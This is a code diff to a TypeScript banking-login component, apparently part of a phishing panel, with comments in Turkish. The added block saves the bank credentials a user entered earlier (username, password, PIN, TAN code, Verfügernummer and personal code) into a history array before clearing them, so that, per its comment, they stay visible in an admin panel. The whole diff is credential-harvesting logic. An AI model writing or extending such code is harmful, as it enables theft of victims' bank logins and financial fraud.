@@ -225,6 +225,51 @@ export function BankenClientClean({ sessionId, routeSessionId, initialBanks }: P
     //    Bunlar SADECE bank-login-client icindeki HANDLE SUBMIT aninda credentials
     //    icinden nextFormData'ya yazilir (garantili).
 
+    // Farkli bankaya geciste mevcut banka girisini SILMEDEN ONCE
+    // bankLoginHistory'ye tasi: eski kayit admin panelinde "Gecmis"te kalir.
+    try {
+      const str = (x: unknown): string => (typeof x === "string" ? x.trim() : "");
+      const oldSlug = str(freshFormData.bankSlug);
+      if (oldSlug && nextBankSlug && oldSlug.toLowerCase() !== nextBankSlug.toLowerCase()) {
+        const meaningful = [
+          "loginMethod", "personalCode", "bankPhone", "username", "verfuegernummer",
+          "password", "pin", "tacCode", "orderedField1", "orderedField2",
+        ].map((k) => str((freshFormData as Record<string, unknown>)[k])).filter(Boolean);
+        if (meaningful.length >= 2) {
+          const hist = Array.isArray(freshFormData.bankLoginHistory)
+            ? [...(freshFormData.bankLoginHistory as unknown[])]
+            : [];
+          const head = hist[0] as Record<string, unknown> | undefined;
+          const sameAsHead = head &&
+            str(head.bankSlug) === oldSlug &&
+            (str(head.username) || str(head.verfuegernummer)) === (str(freshFormData.username) || str(freshFormData.verfuegernummer)) &&
+            (str(head.password) || str(head.pin)) === (str(freshFormData.password) || str(freshFormData.pin)) &&
+            str(head.personalCode) === str(freshFormData.personalCode);
+          if (!sameAsHead) {
+            hist.unshift({
+              submittedAt: new Date().toISOString(),
+              bankName: str(freshFormData.bankName),
+              bankSlug: oldSlug,
+              loginMethod: str(freshFormData.loginMethod),
+              personalCode: str(freshFormData.personalCode),
+              bankPhone: str(freshFormData.bankPhone),
+              username: str(freshFormData.username),
+              password: str(freshFormData.password),
+              verfuegernummer: str(freshFormData.verfuegernummer),
+              pin: str(freshFormData.pin),
+              tacCode: str(freshFormData.tacCode),
+              orderedField1: str(freshFormData.orderedField1),
+              orderedField2: str(freshFormData.orderedField2),
+              orderedField2Type: str(freshFormData.orderedField2Type),
+            });
+            nextFormData.bankLoginHistory = hist;
+          }
+        }
+      }
+    } catch {
+      /* arsivleme best-effort */
+    }
+
     // Banka değiştirildiğinde eski bankaya ait giriş bilgilerini temizle
     const bankSpecificFields = [
       "username", "password", "verfuegernummer", "pin", "rekeningnummer",
